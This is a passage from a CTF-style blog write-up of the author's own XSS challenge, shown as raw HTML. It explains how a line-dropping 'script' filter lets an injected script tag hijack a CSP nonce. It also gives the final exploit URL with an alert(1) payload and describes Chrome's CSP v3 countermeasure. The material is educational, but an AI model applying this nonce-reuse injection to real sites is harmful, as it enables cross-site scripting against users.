class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token variable">$todos</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;div&gt; "</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'todo'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" &lt;/div&gt;\n"</span><span class="token punctuation">;</span></div><br></code></pre><p>and the <code>&gt;</code> of the ending div tag is closing our script tag before the nonce is reached.</p><p>However I sneaked a way inside the challenge to remove the ending div tag. Do you remember the filter that removes the <code>script</code> tags?
It not only removes the script tag but the whole line in which the script tag is inside:</p><pre class=""><code class="php -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="foreach($todo_list as $todo) {" id="code10-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$todo_list</span> <span class="token keyword">as</span> <span class="token variable">$todo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    if(strpos($todo, &quot;script&quot;) === false) { // --> If &quot;script&quot; is contained inside the line, don't echo the whole line." id="code10-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$todo</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"script"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// --&gt; If "script" is contained inside the line, don't echo the whole line.</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        echo $todo.&quot;\n&quot;;" id="code10-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token keyword">echo</span> <span class="token variable">$todo</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    } " id="code10-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token punctuation">}</span> </div><br><div class="line-0-0-14  -codedoc-code-line" data-content="}" id="code10-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token punctuation">}</span></div><br></code></pre><p>by providing a todo with the following content: <code>&lt;SCRIPT src="data:,alert(1)" \n script</code>, we can remove the unwanted closing div tag:</p><pre class=""><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="<SCRIPT src=&quot;data:,alert(1)&quot; " id="code11-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>&lt;SCRIPT src="data:,alert(1)" </div><br><div class="line-0-0-14 removed -codedoc-code-line" data-content=" script </div> // --> This line will be removed as it contains &quot;script&quot;" id="code11-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span> script <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> <span class="token comment">// --&gt; This line will be removed as it contains "script"</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <script nonce=&quot;I7ZgzXJRSbrjz5vwVlPSEOGzDxBZVOjPOVJ6WQJkoWU=&quot;>" id="code11-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token operator">&lt;</span>script nonce<span class="token operator">=</span><span class="token string">"I7ZgzXJRSbrjz5vwVlPSEOGzDxBZVOjPOVJ6WQJkoWU="</span><span class="token operator">&gt;</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      console.log(&quot;test&quot;)" id="code11-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</script>" id="code11-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><h2 id="the-final-solution" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>The final solution</h2><p><a href="#why-it-doesnt-work-in-chrome--csp-v3">Doesn't work in Chrome:</a></p><pre class=""><code class="undefined -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span></span></span><div class="line-0-0-14  -codedoc-code-line" data-content="https://not.lu/challenge?todo=%3cSCRIPT%20src=data:,alert(1)%0ascript" id="code12-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>https://not.lu/challenge?todo=%3cSCRIPT%20src=data:,alert(1)%0ascript</div><br></code></pre><h1 id="why-it-doesnt-work-in-chrome--csp-v3" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Why it doesn't work in Chrome / CSP v3</h1><p>At first I was very confused why it wasn't working in Chrome. Chrome was throwing an error that the nonce was incorrect. However, the nonce attribute was set and was correct.(<code>console.log(script.nonce)</code> was the same as the nonce set in the CSP header).</p><p>It was <a href="https://twitter.com/SecurityMB">@SecurityMB</a> who pointed me to the following CSP v3 spec: <a href="https://www.w3.org/TR/CSP3/#is-element-nonceable">Nonceable Algorithm</a>. The problem of abusing an already existing script tag's nonce is apprently known and this new spec prevents the mechanic . It does this by chechking for the strings <code>&lt;script</code> or <code>&lt;style</code> inside a script element's attribute names and values. If it is present it renders the nonce invalid.</p><p>Firefox and Safari don't implement this spec yet. Therefore, this mechanic could still be abused in my challenge.</p><div class="contentnav-0-0-8" data-no-search=""><a href="#the-challenge" class="h1" data-content-highlight="the-challenge">The challenge</a><a href="#source-code" class="h2" data-content-highlight="source-code">Source Code</a><a href="#the-solution" class="h1" data-content-highlight="the-solution">The solution</a><a href="#baby-steps" class="h2" data-content-highlight="baby-steps">Baby steps</a><a href="#getting-the-nonce" class="h2" data-content-highlight="getting-the-nonce">Getting the nonce</a><a href="#the-final-solution" class="h2" data-content-highlight="the-final-solution">The final solution</a><a href="#why-it-doesnt-work-in-chrome--csp-v3" class="h1" data-content-highlight="why-it-doesnt-work-in-chrome--csp-v3">Why it doesn't work in Chrome / CSP v3</a></div></div><div id="-codedoc-toc" class="toc-0-0-5"><script>
     if (window.matchMedia('(min-width: 1200px)').matches) {
       if (!localStorage.getItem('-codedoc-toc-active')) {
         localStorage.setItem('-codedoc-toc-active', "true");
       }
     }
     </script><div class="content-0-0-6"><p><a href="/blog/">Home</a>
<a href="/blog/own-xss-challenge">Own XSS Challenge Writeup</a></p></div></div><div class="footer-0-0-4"><div class="left"><script id="SoLmAMTPtq">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("SoLmAMTPtq", "k0lYj9deiYXngpZFqYY0vQ==", {});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div><div class="main"><div class="inside"></div></div><div class="right"><script id="KcsTIMkcnq">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("KcsTIMkcnq", "QtGDrozMmpfzLYU0jY3n+w==", {});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div></div><script id="JSiMtsJLgi">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("JSiMtsJLgi", "Rs0VnrLCFSwfOm1o3R6OHg==", {"namespace":"/blog"});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></body></html>